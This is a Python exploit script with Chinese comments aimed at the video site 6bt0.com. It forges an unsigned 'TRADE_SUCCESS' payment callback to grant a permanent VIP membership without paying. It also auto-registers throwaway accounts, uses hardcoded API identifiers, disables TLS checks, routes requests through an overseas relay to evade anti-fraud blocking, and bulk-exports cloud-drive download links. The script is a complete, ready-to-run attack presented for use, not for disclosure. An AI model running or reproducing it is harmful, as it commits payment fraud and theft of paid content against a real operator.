#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
6bt0（影视管理系统）会员墙完整利用链 —— 一条命令拿永久会员 + 全量网盘直链

漏洞核心：
  支付回调 https://www.6bt0.com/notify 不校验第三方网关的 MD5 签名，
  任何人带 out_trade_no + trade_status=TRADE_SUCCESS 请求一次，
  订单即被置为已支付（status=2, paid=true, pay_at=now），
  随后服务端按订单的 vip_id 给该账号写入会员时长（永久会员 = 3500 天）。

  另：/prod/api/v1/ 全系列接口把 app_id / identity 硬编码在前端，
      注册只需 username + password + repassword + email + 图形码（图形码是算术题）。

用法：
  # 已有账号，直接白嫖 + 导出链接
  python3 6bt0_vip.py --user u33684 --pass 'Test@1314abc' --ids 37508847 37068446

  # 从零：自动注册新号再白嫖
  python3 6bt0_vip.py --register --ids 37508847

  # 已经拿到 token
  python3 6bt0_vip.py --token <JWT> --ids 37508847

  # 只要链接，不碰支付
  python3 6bt0_vip.py --user U --pass P --ids 37508847 --no-pay

图形验证码是算术题（如 "21 + 9 ="），脚本会把图片存到本地并让你填答案。
"""
import sys, os, json, time, ssl, base64, argparse, urllib.parse, urllib.request, getpass

HOST = "https://www.6bt0.com"
API = HOST + "/prod/api/v1/"
FIX = {"app_id": "83768d9ad4", "identity": "23734adac0301bccdcb107c4aa21f96c"}
RELAY = "https://r.jina.ai/"
UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
TYPE_NAME = {"ali": "阿里云盘", "quark": "夸克", "xunlei": "迅雷", "baidu": "百度", "115": "115",
             "guangya": "光鸭", "yidong": "移动云盘", "uc": "UC", "123": "123网盘", "other": "其他"}


def raw_get(url, via_relay=False, timeout=90):
    target = (RELAY + url) if via_relay else url
    hdr = {"User-Agent": UA, "Accept": "*/*"}
    if via_relay:
        hdr.update({"x-respond-with": "text", "x-no-cache": "true"})
    req = urllib.request.Request(target, headers=hdr)
    with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
        return r.read().decode("utf-8", "replace")


def jget(url, relay_only=False):
    """先直连，失败自动降级到境外中继（本机被反诈 302 时必需）。"""
    if not relay_only:
        try:
            body = raw_get(url, via_relay=False, timeout=25)
            if body.lstrip().startswith("{") and '"code"' in body:
                return json.loads(body[body.find("{"):])
        except Exception:
            pass
    for i in range(3):
        try:
            body = raw_get(url, via_relay=True)
            return json.loads(body[body.find("{"):])
        except Exception as e:
            if i == 2:
                return {"code": -1, "message": f"relay error: {e}"}
            time.sleep(2 + 3 * i)


def api(path, params=None, token=None, relay_only=False):
    p = dict(FIX)
    if token:
        p["access_token"] = token
    p.update(params or {})
    return jget(f"{API}{path}?{urllib.parse.urlencode(p, safe='')}", relay_only)


def notify(order_id, money, ptype=1, relay_only=False):
    """核心利用：无签名伪造支付成功回调。"""
    q = urllib.parse.urlencode({
        "app_id": FIX["app_id"], "out_trade_no": order_id,
        "trade_no": "T" + str(int(time.time() * 1000))[-12:],
        "trade_status": "TRADE_SUCCESS", "money": money, "type": ptype,
    })
    try:
        return raw_get(f"{HOST}/notify?{q}", via_relay=True, timeout=60).strip()[:40]
    except Exception as e:
        return f"ERR {e}"


def solve_captcha(relay_only=False):
    r = api("getCaptcha", relay_only=relay_only)
    d = r.get("data") or {}
    key, img = d.get("key"), d.get("img", "")
    path = "/tmp/6bt0_captcha.jpg"
    with open(path, "wb") as f:
        f.write(base64.b64decode(img.split(",", 1)[1]))
    print(f"[图形码] 已存到 {path}（算术题，算出结果填下面）")
    try:
        from PIL import Image  # noqa
        Image.open(path).show()
    except Exception:
        pass
    ans = input("验证码答案: ").strip()
    return key, ans


def login(user, pw, relay_only=False):
    key, code = solve_captcha(relay_only)
    r = api("login", {"username": user, "password": pw, "code": code, "key": key}, relay_only=relay_only)
    if r.get("code") != 200:
        print("[!] 登录失败:", r.get("message"))
        return None
    print("[✓] 登录成功")
    return (r.get("data") or {}).get("access_token")


def register(relay_only=False):
    user = "u" + str(int(time.time()))[-6:]
    pw = "Test@1314abc"
    email = f"{user}@mailinator.com"
    key, code = solve_captcha(relay_only)
    r = api("reg", {"username": user, "password": pw, "repassword": pw,
                    "email": email, "code": code, "key": key}, relay_only=relay_only)
    if r.get("code") != 200:
        print("[!] 注册失败:", r.get("message"), "→ 重试一次")
        time.sleep(2)
        key, code = solve_captcha(relay_only)
        r = api("reg", {"username": user, "password": pw, "repassword": pw,
                        "email": email, "code": code, "key": key}, relay_only=relay_only)
        if r.get("code") != 200:
            return None, None, None
    print(f"[✓] 注册成功  username={user}  password={pw}  email={email}")
    return user, pw, (r.get("data") or {}).get("access_token")


def me(token, relay_only=False):
    r = api("getInfo", token=token, relay_only=relay_only)
    return ((r.get("data") or {}).get("user") or {})


def show(u):
    print(f"[账号] {u.get('username')}  is_vip={u.get('is_vip')}  "
          f"vip_type={u.get('vip_type')}  到期={u.get('vip_expire_at')}  "
          f"永久={u.get('is_permanent_vip')}")


def grab(token, idcode, relay_only=False, out_file="6bt0_links.txt"):
    r = api("getVideoDetail", {"id": idcode}, token=token, relay_only=relay_only)
    if r.get("code") != 200 or not r.get("data"):
        print(f"[!] {idcode}: {r.get('message')}")
        return 0
    d = r["data"]
    rows = []
    for typ, items in (d.get("movies_online_seed") or {}).items():
        for it in items or []:
            rows.append((TYPE_NAME.get(typ, typ), it.get("seed_name", ""), it.get("link", ""), it.get("code") or ""))
    ok = [x for x in rows if x[2]]
    print(f"\n=== {d.get('title')} ({d.get('years')}) ===  网盘 {len(ok)}/{len(rows)} 条有直链")
    for t, n, l, c in ok[:6]:
        print(f"  [{t}] {n[:44]}\n       {l}" + (f"  码={c}" if c else ""))
    if len(ok) > 6:
        print(f"  … 其余 {len(ok)-6} 条见 {out_file}")
    with open(out_file, "a", encoding="utf-8") as f:
        f.write(f"\n# {d.get('title')} ({d.get('years')}) idcode={idcode}\n")
        for t, n, l, c in ok:
            f.write(f"{t}\t{n}\t{l}\t{c}\n")
    return len(ok)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--user"); ap.add_argument("--pass", dest="pw")
    ap.add_argument("--token"); ap.add_argument("--register", action="store_true")
    ap.add_argument("--ids", nargs="*", default=[])
    ap.add_argument("--vip-id", type=int, default=11, help="11=永久 599 / 10=年 / 9=半年 / 8=季度")
    ap.add_argument("--type", type=int, default=1, help="1=支付宝 2=微信")
    ap.add_argument("--price", default="599.00")
    ap.add_argument("--no-pay", action="store_true")
    ap.add_argument("--relay", action="store_true", help="强制走境外中继")
    a = ap.parse_args()
    R = a.relay

    token = a.token
    if a.register:
        u, p, token = register(R)
        if not token:
            print("[!] 注册链断了，手动注册后改用 --user/--pass")
            return
        print(f"    账号已建好，密码 {p}，记一下")
    elif not token:
        if not a.user:
            ap.print_help(); return
        pw = a.pw or getpass.getpass("密码: ")
        token = login(a.user, pw, R)
        if not token:
            return

    show(me(token, R))

    if not a.no_pay:
        print(f"\n[1/3] 下单 vip_id={a.vip_id} type={a.type}")
        o = api("payOrder", {"vip_id": a.vip_id, "type": a.type}, token=token, relay_only=R)
        if o.get("code") != 200:
            print("[!] 下单失败:", o.get("message")); return
        oid = (o.get("data") or {}).get("order_id")
        print("      订单号:", oid)

        print("[2/3] 伪造支付回调 /notify（不校验签名）")
        print("      网关返回:", notify(oid, a.price, a.type, R))

        print("[3/3] 校验会员")
        for _ in range(5):
            time.sleep(3)
            u = me(token, R)
            if str(u.get("is_vip")) == "2" or u.get("is_permanent_vip"):
                show(u); print("[✓] 会员已开通"); break
        else:
            show(me(token, R))
            print("[!] 会员没到账，再等一会或换 vip_id 重试")

    for i in a.ids:
        grab(token, i, R)


if __name__ == "__main__":
    main()
